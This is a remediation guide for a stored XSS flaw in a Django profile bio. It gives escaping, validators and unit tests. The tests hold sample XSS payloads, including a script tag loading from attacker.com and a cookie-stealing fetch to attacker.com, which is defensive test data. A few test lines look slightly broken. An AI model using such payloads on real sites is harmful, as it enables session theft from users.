# Stored XSS Fix Implementation Guide

## Overview

This document provides step-by-step instructions to fix the Stored XSS vulnerability in user profile bio rendering.

## Fix 1: Template Output Encoding (dashboard.html)

### Current Code (Line 156)

```django
{% if user.profile.bio %}
<tr>
  <td>Bio</td>
  <td>{{ user.profile.bio }}</td>
</tr>
{% endif %}
```

### Fixed Code

```django
{% if user.profile.bio %}
<tr>
  <td>Bio</td>
  <td>{{ user.profile.bio|escape }}</td>
</tr>
{% endif %}
```

### Why This Works

- The `|escape` filter explicitly escapes HTML special characters
- `<` becomes `&lt;`, `>` becomes `&gt;`, etc.
- JavaScript payloads like `<img src=x onerror="alert('XSS')">` become safe text
- Django auto-escaping should already do this, but being explicit is best practice

### Alternative Approaches

#### Option A: Use `|striptags` (Removes ALL HTML)

```django
<td>{{ user.profile.bio|striptags|escape }}</td>
```

**Pros:** Completely removes HTML tags  
**Cons:** User cannot format text with line breaks in display (though stored as plain text)

#### Option B: Use `|truncatewords_html` (For Summaries)

```django
<td>{{ user.profile.bio|truncatewords_html:50 }}</td>
```

**Pros:** Safely truncates while preserving HTML entity encoding  
**Cons:** Cuts off bio text

**Recommendation:** Use `{{ user.profile.bio|escape }}` (Option 1) - It's explicit, safe, and preserves user content.

---

## Fix 2: Input Validation (forms.py)

### Current Code

```python
class UserProfileForm(forms.ModelForm):
    """Form for updating the extended profile fields."""
    class Meta:
        model = UserProfile
        fields = ('bio',)
        widgets = {
            'bio': forms.Textarea(attrs={'rows': 4, 'placeholder': 'Tell us a little about yourself…'}),
        }
```

### Fixed Code

```python
from django import forms
from django.core.validators import RegexValidator
from .models import UserProfile

class UserProfileForm(forms.ModelForm):
    """Form for updating the extended profile fields."""

    # Validator: Bio cannot contain HTML tags (defense-in-depth against XSS)
    bio = forms.CharField(
        max_length=500,
        required=False,
        widget=forms.Textarea(attrs={'rows': 4, 'placeholder': 'Tell us a little about yourself…'}),
        validators=[
            RegexValidator(
                regex=r'^[^<>]*$',
                message='Bio cannot contain HTML tags or angle brackets.',
                code='invalid_bio_html'
            ),
        ],
        help_text='Plain text only. HTML tags are not permitted.'
    )

    class Meta:
        model = UserProfile
        fields = ('bio',)
```

### Why This Works

- Prevents `<` and `>` characters in bio input
- Blocks most HTML injection vectors at input (defense-in-depth)
- User-friendly error message explains the restriction
- Works alongside output encoding for defense-in-depth

### Testing the Validator

```python
# Should pass
form = UserProfileForm(data={'bio': 'I love web development!'})
assert form.is_valid()

# Should fail - HTML tag attempted
form = UserProfileForm(data={'bio': 'Hello <script>alert("XSS")</script>'})
assert not form.is_valid()
assert 'HTML tags' in str(form.errors)
```

---

## Fix 3: Model Validation (models.py)

### Current Code

```python
class UserProfile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='profile')
    bio = models.TextField(blank=True, max_length=500)
    # ... rest of model
```

### Fixed Code

```python
from django.db import models
from django.core.validators import RegexValidator

class UserProfile(models.Model):
    # Validator ensures no HTML-like content even if form validation is bypassed
    bio_validator = RegexValidator(
        regex=r'^[^<>]*$',
        message='Bio cannot contain HTML tags.',
        code='invalid_bio'
    )

    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='profile')
    bio = models.TextField(
        blank=True,
        max_length=500,
        validators=[bio_validator],
        help_text='Brief bio (plain text only, no HTML allowed)'
    )
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f'{self.user.username} Profile'

    class Meta:
        verbose_name = 'User Profile'
        verbose_name_plural = 'User Profiles'
        permissions = [
            ('can_view_user_list',          'Can view list of all users'),
            ('can_access_instructor_panel', 'Can access the instructor panel'),
            ('can_access_admin_panel',      'Can access the admin management panel'),
        ]
```

### Why This Works

- Validators run even if form is bypassed (e.g., direct API calls)
- Protects the database from malicious data
- Ensures data integrity across all code paths

---

## Fix 4: Security Tests (tests.py)

Add these test cases to `kayigamba_david/tests.py`:

```python
from django.test import TestCase, Client
from django.contrib.auth.models import User
from .models import UserProfile
from .forms import UserProfileForm


class StoredXSSSecurityTests(TestCase):
    """
    Tests verify that stored XSS vulnerability is fixed.
    Ensures user-controlled content cannot execute JavaScript.
    """

    def setUp(self):
        """Create test user and profile."""
        self.user = User.objects.create_user(
            username='testuser',
            email='test@example.com',
            password='TestPass123!'
        )
        self.profile = UserProfile.objects.create(user=self.user)
        self.client = Client()

    # ── Form Validation Tests ────────────────────────────────────────────────

    def test_bio_form_rejects_html_tags(self):
        """Form validation should reject HTML tags in bio."""
        form = UserProfileForm(data={
            'bio': '<script>alert("XSS")</script>'
        })
        self.assertFalse(form.is_valid())
        self.assertIn('HTML tags', str(form.errors))

    def test_bio_form_rejects_img_onerror_payload(self):
        """Form validation should reject image tag with onerror handler."""
        form = UserProfileForm(data={
            'bio': '<img src=x onerror="alert(\'XSS\')">'
        })
        self.assertFalse(form.is_valid())
        self.assertIn('HTML tags', str(form.errors))

    def test_bio_form_rejects_iframe_payload(self):
        """Form validation should reject iframe injection."""
        form = UserProfileForm(data={
            'bio': '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        })
        self.assertFalse(form.is_valid())
        self.assertIn('HTML tags', str(form.errors))

    def test_bio_form_accepts_plain_text(self):
        """Form validation should accept plain text bio."""
        form = UserProfileForm(data={
            'bio': 'I love web development and security!'
        })
        self.assertTrue(form.is_valid())

    def test_bio_form_accepts_special_characters(self):
        """Form validation should accept special characters (except < >)."""
        form = UserProfileForm(data={
            'bio': 'Love Python & Django! C# is cool... (don\'t you think?)'
        })
        self.assertTrue(form.is_valid())

    # ── Model Validation Tests ───────────────────────────────────────────────

    def test_model_rejects_bio_with_html_tags(self):
        """Model validation should prevent HTML tags in bio."""
        profile = UserProfile(
            user=self.user,
            bio='<script>alert("XSS")</script>'
        )
        with self.assertRaises(Exception):  # ValidationError
            profile.full_clean()

    # ── Template Rendering Tests ─────────────────────────────────────────────

    def test_dashboard_escapes_html_in_bio(self):
        """Dashboard template should escape HTML in user bio."""
        # Set bio with HTML content (bypassing form validation for this test)
        self.profile.bio = '<img src=x onerror="alert(\'XSS\')">'
        self.profile.save(update_fields=['bio'])

        # Login and view dashboard
        self.client.login(username='testuser', password='TestPass123!')
        response = self.client.get('/auth/dashboard/')

        # Verify HTML is escaped in response, not executed
        self.assertContains(response, '&lt;img', status_code=200)
        self.assertContains(response, 'src=x onerror', status_code=200)

        # Verify the dangerous payload is NOT in the response as raw HTML
        # (it should be escaped)
        content = response.content.decode('utf-8')
        self.assertNotIn('<img src=x onerror=', content)

    def test_dashboard_displays_plain_text_bio(self):
        """Dashboard template should display plain text bio correctly."""
        self.profile.bio = 'I love Python and Django!'
        self.profile.save()

        self.client.login(username='testuser', password='TestPass123!')
        response = self.client.get('/auth/dashboard/')

        self.assertContains(response, 'I love Python and Django!', status_code=200)

    def test_dashboard_preserves_special_characters_in_bio(self):
        """Dashboard should preserve special characters in bio."""
        self.profile.bio = 'C++ & Python are great! "Love" them... (really!)'
        self.profile.save()

        self.client.login(username='testuser', password='TestPass123!')
        response = self.client.get('/auth/dashboard/')

        # Special characters should be properly escaped/displayed
        self.assertStatusCode(response, 200)
        # The ampersand should be escaped as &amp;
        content = response.content.decode('utf-8')
        self.assertIn('&amp;', content)  # & is escaped

    # ── XSS Payload Tests (Proof of Concept) ─────────────────────────────────

    def test_xss_payload_script_tag_neutralized(self):
        """Script tags in bio should be neutralized in output."""
        payloads = [
            '<script>alert("XSS")</script>',
            '<script src="https://attacker.com/evil.js"></script>',
            'javascript:alert("XSS")',
            '<svg onload="alert(\'XSS\')">',
        ]

        for payload in payloads:
            # Try via form (should fail)
            form = UserProfileForm(data={'bio': payload})
            self.assertFalse(form.is_valid(), f"Payload not rejected: {payload}")

    def test_xss_payload_cookie_stealer_neutralized(self):
        """Cookie-stealing payload should be disarmed."""
        payload = '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">'

        form = UserProfileForm(data={'bio': payload})
        self.assertFalse(form.is_valid())
```

### Running the Tests

```bash
python manage.py test kayigamba_david.StoredXSSSecurityTests -v 2
```

---

## Implementation Verification Checklist

After applying fixes, verify:

- [ ] **Template Fix Applied**
  - [ ] `dashboard.html` line 156 uses `{{ user.profile.bio|escape }}`
  - [ ] All user bio references use escape filter

- [ ] **Input Validation Added**
  - [ ] `UserProfileForm` has RegexValidator for HTML tag prevention
  - [ ] `UserProfile` model has validators
  - [ ] Form shows helpful error message for HTML tags

- [ ] **Tests Added**
  - [ ] All XSS payload tests pass (form rejects them)
  - [ ] Plain text tests pass (legitimate content accepted)
  - [ ] Template rendering test passes (HTML is escaped)
  - [ ] Model validation test passes

- [ ] **Functionality Preserved**
  - [ ] Profile edit form loads without errors
  - [ ] Profile can be saved with valid bio
  - [ ] Dashboard displays bio correctly
  - [ ] Special characters (& " ') work correctly
  - [ ] Unicode/emoji support maintained

---

## Defense-in-Depth Summary

This fix implements 3 layers of XSS protection:

1. **Input Validation (forms.py & models.py)**
   - Prevents HTML tags at entry point
   - User-friendly validation messages
   - Stops attacks before database

2. **Output Encoding (dashboard.html)**
   - Explicit `|escape` filter
   - Escapes any stored malicious content
   - Safe fallback if validation bypassed

3. **Testing**
   - Automated tests verify both layers work
   - Regression protection for future changes
   - Proof that issue is fixed

---

## Next Steps

1. Apply Fix 1 (Template) - Critical, quick fix
2. Apply Fix 2 & 3 (Forms & Models) - Input validation
3. Add Fix 4 (Tests) - Verification
4. Run full test suite: `python manage.py test`
5. Manual testing: Try uploading XSS payloads
6. Document in PR: Link to OWASP XSS prevention guide
